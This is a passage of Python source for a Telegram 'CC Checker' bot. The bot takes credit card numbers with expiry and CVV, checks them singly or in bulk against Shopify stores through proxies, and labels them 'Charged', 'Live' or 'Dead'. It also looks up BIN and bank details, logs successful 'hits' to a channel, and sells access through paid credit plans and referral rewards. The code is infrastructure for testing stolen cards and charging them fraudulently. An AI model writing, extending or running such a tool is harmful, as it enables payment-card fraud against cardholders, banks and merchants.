async def save_hits_to_file(results, user_id):
    """Save charged hits to a file"""
    if not results.get('charged'):
        return None
    
    uid = str(user_id)
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"hits_{uid}_{now}.txt"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(f"💣 CHARGED ({len(results['charged'])}):\n")
        await f.write("=" * 50 + "\n")
        for r in results['charged']:
            await f.write(f"Card: {r['card']}\n")
            await f.write(f"Gateway: {r['gateway']}\n")
            await f.write(f"Price: {r['price']}\n")
            await f.write(f"Response: {str(r['result'].get('msg', 'N/A'))}\n")
            await f.write("-" * 30 + "\n")
        
        if results.get('approved'):
            await f.write(f"\n✅ LIVE ({len(results['approved'])}):\n")
            await f.write("=" * 50 + "\n")
            for r in results['approved']:
                await f.write(f"Card: {r['card']}\n")
                await f.write(f"Gateway: {r['gateway']}\n")
                await f.write(f"Price: {r['price']}\n")
                await f.write("-" * 30 + "\n")
        
        await f.write(f"\n❌ DEAD ({len(results['dead'])}):\n")
        await f.write("=" * 50 + "\n")
        for r in results['dead'][:50]:
            await f.write(f"Card: {r['card']}\n")
    
    return filename

# ========== PROGRESS UPDATE & FINAL RESULTS ==========
async def update_progress(user_id, message_id, results, current_attempt_count):
    """Update the progress message during mass checking"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = 'Unknown'
    if results['charged']:
        gateway = results['charged'][0].get('gateway', 'Unknown')
    elif results['approved']:
        gateway = results['approved'][0].get('gateway', 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    progress_text = (
        f"<b>🔥 CC Checker</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>✅ Progress</b>\n"
        f"<blockquote>🔥 Total: {results['total']} | 💣 Charged: {len(results['charged'])} | ✅ Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>\n"
        f"<blockquote>🔢 Checked: {current_attempt_count}/{results['total']}</blockquote>\n"
        f"<blockquote>✅ Gateway: ✅ {gateway}</blockquote>\n"
        f"<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>\n"
        f"<blockquote>💰 Credits Left: {remaining_credits}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, progress_text, buttons=buttons, parse_mode='html')
    except Exception:
        pass

async def send_final_results(user_id, results):
    """Send final results after mass checking completes"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"💣 <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = 'Unknown'
    if results['charged']:
        gateway = results['charged'][0].get('gateway', 'Unknown')
    elif results['approved']:
        gateway = results['approved'][0].get('gateway', 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    summary = (
        f"<b>🔥 CC Checker 🔥</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>✅ Results</b>\n"
        f"<blockquote>🔥 Total: {results['total']} | 💣 Charged: {len(results['charged'])} | ✅ Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>\n"
        f"<blockquote>✅ Gateway: ✅ {gateway}</blockquote>\n"
        f"<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>\n"
        f"<blockquote>💰 Credits Left: {remaining_credits}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🔥 Hits</b>\n"
        f"<blockquote>{hits_text}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("🔥 CC CHECKER RESULTS 🔥\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"💣 CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r.get('message', '')[:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"✅ APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r.get('message', '')[:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r.get('message', '')[:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, summary, file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except Exception:
        pass

# ========== JOINED USERS TRACKING ==========
def set_user_joined(user_id):
    joined_users.add(user_id)

# ========== /start COMMAND (UNIFIED - handles referral codes too) ==========

@bot.on(events.NewMessage(pattern=r'^/start(\s+\w+)?(@\w+)?$'))
async def start(event):
    user_id = event.sender_id
    
    # Process referral code if present
    text = event.message.text.strip()
    parts = text.split()
    if len(parts) > 1 and not parts[1].startswith('@'):
        ref_code = parts[1]
        success, referrer_id = process_referral(user_id, ref_code)
        if success:
            try:
                await bot.send_message(
                    referrer_id,
                    f"🎉 <b>New Referral!</b>\n\n"
                    f"User <code>{user_id}</code> joined using your referral link!\n\n"
                    f"💰 You earned <b>{REFERRAL_REWARD} credits</b>!",
                    parse_mode='html'
                )
            except Exception:
                pass
    
    if is_banned(user_id):
        return await event.reply("🔴 You are banned from using this bot.")
    
    joined, missing_chats = await check_user_joined(user_id)
    if not joined:
        buttons = []
        for link in missing_chats:
            buttons.append([Button.url("🔗 Join Channel", link)])
        buttons.append([Button.inline("✅ Joined", b"check_joined")])
        missing_text = "\n".join([f"👉 <a href='{link}'>Click here to join</a>" for link in missing_chats])
        return await event.reply(
            f"<b>⚠️ Access Denied!</b>\n\n"
            f"You must join the following channels first:\n\n{missing_text}\n\n"
            f"Then click 'Joined' button.",
            buttons=buttons,
            parse_mode='html'
        )
    
    set_user_joined(user_id)
    is_prem = is_premium(user_id)
    is_adm = is_admin(user_id)
    credits = get_user_credits(user_id)
    plan_name = get_user_plan_name(user_id)
    
    text = (
        f"<b>🔥 Welcome to CC Checker Bot</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>✅ CC Commands</b>\n"
        f"<blockquote>👉 /cc card|mm|yy|cvv - Check single CC (1 credit)\n"
        f"👉 /chk - Reply to .txt file to check cards (1 credit per card)\n"
        f"👉 /multi card1|mm|yy|cvv card2|mm|yy|cvv - Check up to 10 cards at once\n"
        f"👉 /mcc card|mm|yy|cvv - Check 1 card against ALL sites\n"
        f"⚠️ NOTE -\n"
        f"👉 No proxy or site setup needed!\n"
        f"👉 The bot comes with pre-configured\n"
        f"  proxies & sites.\n"
        f"👉 Just use /cc or /chk and start\n"
        f"  checking cards instantly! 🔥</blockquote>\n"
        f"\n<b>✅ Site Commands</b>\n"
        f"<blockquote>👉 /site - Check all sites & remove dead\n"
        f"👉 /addsite site.com - Add single site\n"
        f"👉 /addsitetxt - Add sites from .txt file (bulk)\n"
        f"👉 /rm url - Remove a specific site\n"
        f"👉 /clearsite - Clear all sites (with backup)\n"
        f"👉 /getsites - Get all sites list</blockquote>\n"
        f"<b>✅ Proxy Commands</b>\n"
        f"<blockquote>👉 /proxy - Check all proxies & remove dead\n"
        f"👉 /addproxy - Add proxies (one per line)\n"
        f"👉 /addproxytxt - Add proxies from .txt file (bulk)\n"
        f"👉 /chkproxy proxy - Check single proxy\n"
        f"👉 /rmproxy proxy - Remove single proxy\n"
        f"👉 /rmproxyindex 1,2,3 - Remove by index\n"
        f"👉 /clearproxy - Remove all proxies\n"
        f"👉 /getproxy - Get all proxies\n"
        f"👉 /setproxy proxy - Set your personal proxy for mass checking\n"
        f"👉 /myproxy - View your personal proxies\n"
        f"👉 /delmyproxy proxy - Delete a personal proxy\n"
        f"👉 /clearmyproxy - Clear all your personal proxies</blockquote>\n"
        f"<b>✅ Credits & Keys</b>\n"
        f"<blockquote>👉 /redeem KEY - Redeem premium key (Premium + Credits)\n"
        f"👉 /redeemcredit KEY - Redeem credit key (Only credits)\n"
        f"👉 /plans - Check premium plans\n"
        f"👉 /info - Your account details & credits\n"
        f"👉 /myhistory - Your hit statistics\n"
        f"👉 /transfercredits user_id amount - Transfer credits\n"
        f"👉 /ping - Check bot response time\n"
        f"👉 /refer - Get your referral code & earn credits\n"
        f"👉 /topusers - Top 10 hit leaderboard\n"
        f"⚠️ JOIN LOGS - https://t.me/dududadadee2</blockquote>"
    )
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        if expiry != 'Unknown':
            try:
                expiry_dt = datetime.fromisoformat(expiry)
                expiry_str = expiry_dt.strftime('%Y-%m-%d')
                days_left = (expiry_dt - datetime.now()).days
            except Exception:
                expiry_str = 'Unknown'
                days_left = 0
        else:
            expiry_str = 'Unknown'
            days_left = 0
        text += (
            f"\n\n<b>🏆 Premium Access Active!</b>\n"
            f"<b>🏅 Plan:</b> {plan_name}\n"
            f"<b>💰 Credits Available:</b> {credits}\n"
            f"<b>📅 Days Left:</b> {days_left} days\n"
            f"<b>⏰ Expires:</b> {expiry_str}"
        )
    else:
        text += (
            f"\n\n<b>⚠️ Premium required for /cc and /chk commands</b>\n"
            f"<b>💰 Credits Available:</b> {credits}"
        )
    
    if is_adm:
        text += (
            f"\n<b>✅ Admin Commands</b>\n"
            f"<blockquote>👉 /filter - Set site price filter\n"
            f"👉 /addpremium user_id plan_name - Add premium with plan\n"
            f"👉 /addpremiumcustom user_id days credits - Add custom premium\n"
            f"👉 /removepremium user - Remove premium\n"
            f"👉 /addcredits user amount - Add credits to user\n"
            f"👉 /removecredits user amount - Remove credits from user\n"
            f"👉 /genpremiumkey amount plan - Generate premium keys\n"
            f"👉 /genpremiumkey amount custom days credits - Generate custom premium keys\n"
            f"👉 /gencreditkey amount credits - Generate credit-only keys\n"
            f"👉 /ban user - Ban user\n"
            f"👉 /unban user - Unban user\n"
            f"👉 /stats - Bot statistics\n"
            f"👉 /allstats - Full stats with hit history\n"
            f"👉 /userlist - List all premium users\n"
            f"👉 /checkcredits user_id - Check user credits\n"
            f"👉 /setcredits user_id amount - Set exact credits\n"
            f"👉 /exportstats - Export full hit stats file\n"
            f"👉 /activecheck - See who is checking now\n"
            f"👉 /broadcast msg - Broadcast message to ALL users\n"
            f"👉 /groupmode on/off - Enable/disable bot in current group</blockquote>"
        )
    
    text += (
        f"\n\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    await event.reply(text, parse_mode='html')


# ========== CALLBACK: Check Joined ==========

@bot.on(events.CallbackQuery(pattern=b"check_joined"))
async def check_joined_callback(event):
    user_id = event.sender_id
    joined, _ = await check_user_joined(user_id)
    if joined:
        set_user_joined(user_id)
        await event.edit(
            "✅ <b>Verification successful!</b>\n\nUse /start again to access the bot.",
            parse_mode='html'
        )
    else:
        await event.answer("❌ You haven't joined all channels yet! Please join first.", alert=True)


# ========== /plans COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/plans(@\w+)?$'))
async def plans_command(event):
    text = (
        f"<b>🏆 PREMIUM PLANS 🏆</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"\n<b>🏅 TRIAL</b>\n"
        f"👉 1 Day Access\n"
        f"👉 3,000 Credits\n"
        f"👉 Price: 2$\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"\n<b>🥉 BRONZE</b>\n"
        f"👉 3 Days Access\n"
        f"👉 8,000 Credits\n"
        f"👉 Price: 4$\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"\n<b>🥈 SILVER</b>\n"
        f"👉 7 Days Access\n"
        f"👉 14,000 Credits\n"
        f"👉 Price: 8$\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"\n<b>🥇 GOLD</b>\n"
        f"👉 14 Days Access\n"
        f"👉 20,000 Credits\n"
        f"👉 Price: 12$\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"\n<b>🏆 PLATINUM</b>\n"
        f"👉 24 Days Access\n"
        f"👉 30,000 Credits\n"
        f"👉 Price: 22$\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"\n<b>💡 How to Purchase?</b>\n"
        f'Contact: <a href="tg://user?id=7415233736">Mydev1</a>\n'
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    await event.reply(text, parse_mode='html')


# ========== /info COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/info(@\w+)?$'))
async def info_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    credits = get_user_credits(user_id)
    is_prem = is_premium(user_id)
    plan_name = get_user_plan_name(user_id)
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        days_added = premium_data.get('days', 0)
        added_at = premium_data.get('added_at', 'Unknown')
        if expiry != 'Unknown':
            try:
                expiry_dt = datetime.fromisoformat(expiry)
                expiry_str = expiry_dt.strftime('%Y-%m-%d %H:%M:%S')
                days_left = (expiry_dt - datetime.now()).days
            except Exception:
                expiry_str = 'Unknown'
                days_left = 0
        else:
            expiry_str = 'Unknown'
            days_left = 0
        
        text = (
            f"<b>🏆 YOUR ACCOUNT INFO 🏆</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"\n<b>✅ User ID:</b> <code>{user_id}</code>\n"
            f"<b>🏆 Status:</b> <b>PREMIUM</b>\n"
            f"<b>🏅 Plan:</b> {plan_name}\n"
            f"<b>💰 Credits:</b> {credits}\n"
            f"<b>⏰ Premium Expires:</b> {expiry_str}\n"
            f"<b>📅 Days Left:</b> {days_left} days\n"
            f"<b>💡 Plan Duration:</b> {days_added} days\n"
            f"<b>💰 Activated:</b> {added_at}\n"
            f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"🎉 Use /plans to see available plans\n"
            f"🎉 Contact @Mydev1 to recharge\n"
            f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
        )
    else:
        text = (
            f"<b>⚠️ YOUR ACCOUNT INFO ⚠️</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"\n<b>✅ User ID:</b> <code>{user_id}</code>\n"
            f"<b>🏆 Status:</b> FREE USER\n"
            f"<b>🏅 Plan:</b> FREE\n"
            f"<b>💰 Credits:</b> {credits}\n"
            f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"🏆 Premium Required to use /cc and /chk\n"
            f"🎉 Use /plans to see premium plans\n"
            f"🎉 Use /redeem to activate premium key\n"
            f"🎉 Use /redeemcredit to activate credit key\n"
            f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
        )
    
    await event.reply(text, parse_mode='html')


# ========== /redeem COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/redeem(@\w+)?(\s+.*)?$'))
async def redeem_premium_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/redeem PREMIUM_KEY</code>", parse_mode='html')
    
    key = args[1].strip().upper()
    success, msg = redeem_premium_key(key, user_id)
    
    if success:
        credits = get_user_credits(user_id)
        await event.reply(f"✅ <b>{msg}</b>\n\n💰 Your Credits: {credits}", parse_mode='html')
    else:
        await event.reply(f"❌ <b>{msg}</b>", parse_mode='html')


# ========== /redeemcredit COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/redeemcredit(@\w+)?(\s+.*)?$'))
async def redeem_credit_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/redeemcredit CREDIT_KEY</code>", parse_mode='html')
    
    key = args[1].strip().upper()
    success, credits = redeem_credit_key(key, user_id)
    
    if success:
        total_credits = get_user_credits(user_id)
        await event.reply(
            f"✅ <b>Credit Key Redeemed!</b>\n\n"
            f"💰 Added: {credits} credits\n"
            f"🔥 Total Credits: {total_credits}",
            parse_mode='html'
        )
    else:
        await event.reply(f"❌ <b>{credits}</b>", parse_mode='html')


# ========== /ping COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/ping(@\w+)?$'))
async def ping_command(event):
    start_time = time.time()
    msg = await event.reply("🏓 Pong!", parse_mode='html')
    end_time = time.time()
    ping_ms = round((end_time - start_time) * 1000, 2)
    await msg.edit(f"🏓 <b>Pong!</b>\n\n<b>Response Time:</b> {ping_ms}ms", parse_mode='html')


# ========== /refer COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/refer(@\w+)?$'))
async def refer_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    code = get_referral_code(user_id)
    data = load_referrals()
    user_data = data.get(str(user_id), {})
    total_referred = len(user_data.get('referred', []))
    total_earned = user_data.get('total_earned', 0)
    
    bot_username = (await bot.get_me()).username
    
    text = (
        f"<b>🎉 Referral Program</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🔥 Your Referral Link:</b>\n"
        f"<code>https://t.me/{bot_username}?start={code}</code>\n"
        f"\n<b>💰 Earn:</b> {REFERRAL_REWARD} credits per referral!\n"
        f"<b>🎉 Total Referred:</b> {total_referred}\n"
        f"<b>🎉 Total Earned:</b> {total_earned} credits\n"
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"🏅 <b>How it works:</b>\n"
        f"1. Share your referral link\n"
        f"2. New users join via your link\n"
        f"3. You earn {REFERRAL_REWARD} credits for each!\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    await event.reply(text, parse_mode='html')


# ========== /myhistory COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/myhistory(@\w+)?$'))
async def my_history_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    stats = load_hit_stats()
    user_stats = stats.get(str(user_id), {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0})
    
    text = (
        f"<b>🏆 Your Hit Statistics</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"\n<b>🔥 Hits Summary</b>\n"
        f"<blockquote>💣 Charged: {user_stats.get('charged', 0)}\n"
        f"✅ Live: {user_stats.get('approved', 0)}\n"
        f"❌ Dead: {user_stats.get('dead', 0)}\n"
        f"🔢 Total: {user_stats.get('total', 0)}</blockquote>\n"
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"💰 Current Credits: {get_user_credits(user_id)}\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    await event.reply(text, parse_mode='html')


# ========== /transfercredits COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/transfercredits(@\w+)?(\s+.*)?$'))
async def transfer_credits_command(event):
    sender_id = event.sender_id
    if is_banned(sender_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/transfercredits user_id amount</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except Exception:
        return await event.reply("❌ Invalid user_id or amount.", parse_mode='html')
    
    if amount <= 0:
        return await event.reply("❌ Amount must be positive!", parse_mode='html')
    
    if target_id == sender_id:
        return await event.reply("❌ You cannot transfer credits to yourself!", parse_mode='html')
    
    sender_credits = get_user_credits(sender_id)
    if sender_credits < amount:
        return await event.reply(
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"You have: {sender_credits}\n"
            f"Trying to send: {amount}",
            parse_mode='html'
        )
    
    remove_credits(sender_id, amount)
    add_credits(target_id, amount)
    
    await event.reply(
        f"✅ <b>Transfer Successful!</b>\n\n"
        f"Sent: {amount} credits\n"
        f"To: <code>{target_id}</code>\n"
        f"Your Remaining: {get_user_credits(sender_id)}",
        parse_mode='html'
    )
    
    try:
        await bot.send_message(
            target_id,
            f"💰 <b>You received {amount} credits!</b>\n\n"
            f"From: <code>{sender_id}</code>\n"
            f"New Balance: {get_user_credits(target_id)}",
            parse_mode='html'
        )
    except Exception:
        pass


# ========== /topusers COMMAND ==========

@bot.on(events.NewMessage(pattern=r'^/topusers(@\w+)?$'))
async def top_users_command(event):
    if is_banned(event.sender_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    stats = load_hit_stats()
    sorted_users = sorted(
        stats.items(),
        key=lambda x: x[1].get('charged', 0) + x[1].get('approved', 0),
        reverse=True
    )[:10]
    
    text = (
        f"<b>🏆 Top 10 Users</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
    )
    
    if not sorted_users:
        text += "No data yet."
    else:
        for i, (uid, data) in enumerate(sorted_users, 1):
            hits = data.get('charged', 0) + data.get('approved', 0)
            if i == 1:
                emoji = "🥇"
            elif i == 2:
                emoji = "🥈"
            elif i == 3:
                emoji = "🥉"
            else:
                emoji = f"{i}."
            text += (
                f"<blockquote>{emoji} <code>{uid}</code>: {hits} hits "
                f"(💣{data.get('charged', 0)}|✅{data.get('approved', 0)}|❌{data.get('dead', 0)})</blockquote>\n"
            )
    
    text += (
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    await event.reply(text, parse_mode='html')


# ========== /filter COMMAND (Admin) ==========

@bot.on(events.NewMessage(pattern=r'^/filter(@\w+)?(\s+.*)?$'))
async def filter_command(event):
    global ACTIVE_FILTER
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        filters_text = "\n".join([
            f"👉 <code>/{key}</code> - {val['name']}" for key, val in SITE_FILTERS.items()
        ])
        await event.reply(
            f"<b>🔥 Site Price Filters</b>\n\n{filters_text}\n\n"
            f"<b>Current Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n"
            f"<b>Usage:</b> <code>/filter under10</code>",
            parse_mode='html'
        )
        return
    
    filter_key = args[1].lower()
    if filter_key not in SITE_FILTERS:
        await event.reply(
            f"❌ Invalid filter. Use: {', '.join(SITE_FILTERS.keys())}",
            parse_mode='html'
        )
        return
    
    ACTIVE_FILTER = filter_key
    await event.reply(
        f"✅ <b>Filter Updated!</b>\n\nNow using: {SITE_FILTERS[ACTIVE_FILTER]['name']}",
        parse_mode='html'
    )

# ======================================================================
# PART 3: CC CHECKING COMMANDS + SITE & PROXY COMMANDS
# ======================================================================

# ========== /cc COMMAND (Single Card Check) ==========

@bot.on(events.NewMessage(pattern=r'^/cc(@\w+)?(\s+.*)?$'))
async def single_cc_check(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    if not is_admin(user_id):
        allowed, wait_sec = check_rate_limit(user_id)
        if not allowed:
            return await event.reply(
                f"⏳ <b>Slow down!</b> Wait <b>{wait_sec}s</b> before next check.",
                parse_mode='html'
            )
    
    is_group_check = event.is_group
    is_group_enabled_check = is_group_enabled(event.chat_id) if is_group_check else False
    
    if not is_group_enabled_check and not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(
            "❌ <b>Premium Required!</b>\n\n"
            "Use /redeem to activate premium access.",
            parse_mode='html'
        )
    
    if not is_group_enabled_check:
        current_credits = get_user_credits(user_id)
        if current_credits < 1:
            return await event.reply(
                "❌ <b>Insufficient Credits!</b>\n\n"
                "You need 1 credit to check a card.\n"
                "Your Credits: 0\n\n"
                "Use /redeemcredit CREDIT_KEY to add credits.",
                parse_mode='html'
            )
    else:
        current_credits = "Free"
    
    sites = load_sites()
    proxies = load_proxies()
    
    if not sites:
        return await event.reply("❌ No sites available. Contact admin.", parse_mode='html')
    if not proxies:
        proxies = [None]
    
    try:
        cc_input = re.sub(r'^/cc(@\w+)?(\s+)?', '', event.message.text).strip()
    except IndexError:
        return await event.reply("❌ Usage: <code>/cc card|mm|yy|cvv</code>", parse_mode='html')
    
    cards = extract_cc(cc_input)
    if not cards:
        return await event.reply("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>", parse_mode='html')
    
    card = cards[0]
    
    filter_info = f"\n🔥 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"
    credit_display = f"{current_credits} (1 will be deducted)" if not is_group_enabled_check else "Free (Group Mode)"
    
    status_msg = await event.reply(
        f"<b>🔥 CC Checker</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>✅ Checking...</b>\n"
        f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"{filter_info}\n"
        f"<b>💰 Credits: {credit_display}</b>",
        parse_mode='html'
    )
    
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        if not is_group_enabled_check:
            success, new_credits = deduct_credit(user_id)
        else:
            success = True
            new_credits = current_credits
        
        is_charged = (
            result['status'] == 'Charged' or
            'order completed' in result.get('message', '').lower() or
            'order_placed' in result.get('message', '').lower() or
            'ORDER_PLACED' in result.get('message', '') or
            'thank you' in result.get('message', '').lower() or
            'payment successful' in result.get('message', '').lower()
        )
        
        if is_charged:
            status_emoji = "💣"
            status_text = "Charged"
            record_hit(user_id, 'charged')
            try:
                sender = await event.get_sender()
                username = sender.username if sender.username else None
                await send_log_to_channel(
                    result['message'][:150],
                    result.get('gateway', 'Unknown'),
                    result.get('price', '-'),
                    username, user_id
                )
            except Exception:
                await send_log_to_channel(
                    result['message'][:150],
                    result.get('gateway', 'Unknown'),
                    result.get('price', '-'),
                    str(user_id), user_id
                )
        elif result['status'] == 'Approved':
            status_emoji = "✅"
            status_text = "Live"
            record_hit(user_id, 'approved')
        else:
            status_emoji = "❌"
            status_text = "Dead"
        
        remaining_credits = get_user_credits(user_id) if not is_group_enabled_check else "Free"
        
        final_resp = (
            f"<b>🔥 #SHOPIFY</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>✅ Hit Found!</b>\n"
            f"<blockquote>{status_emoji} Status: {status_text}</blockquote>\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
            f"<blockquote>📝 Response: {result['message'][:150]}</blockquote>\n"
            f"<blockquote>✅ Gateway: ✅ {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>✅ BIN Info</b>\n"
            f"<pre>BIN Info: {brand} - {bin_type} - {level}\n"
            f"Bank: {bank}\n"
            f"Country: {country} {flag}</pre>\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"🔥 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}\n"
            f"<b>💰 Credits Left: {remaining_credits}</b>\n"
            f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
        )
        
        await status_msg.edit(final_resp, parse_mode='html')
        await check_credits_low(user_id)
        
    except Exception as e:
        await status_msg.edit(f"❌ Error checking card: {e}", parse_mode='html')


# ========== /chk COMMAND (Mass Check from .txt File) ==========

@bot.on(events.NewMessage(pattern=r'^/chk(@\w+)?(\s+.*)?$'))
async def check_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    is_group_check = event.is_group
    is_group_enabled_check = is_group_enabled(event.chat_id) if is_group_check else False
    
    if not is_group_enabled_check and not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(
            "❌ <b>Premium Required!</b>\n\n"
            "Use /redeem to activate premium access.",
            parse_mode='html'
        )
    
    if not event.reply_to_msg_id:
